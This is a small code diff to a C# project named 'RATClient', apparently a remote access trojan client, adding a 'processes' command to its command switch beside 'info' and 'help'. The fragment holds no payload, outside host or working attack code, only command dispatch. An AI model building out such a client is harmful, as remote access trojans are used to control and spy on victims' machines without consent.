@@ -46,6 +46,9 @@ namespace RATClient
                     case "info":
                         SendCommand(CMDS);
                         break;
+                    case "processes":
+                        SendCommand(CMDS);
+                        break;
                     case "help":
                         Help();
                         break;
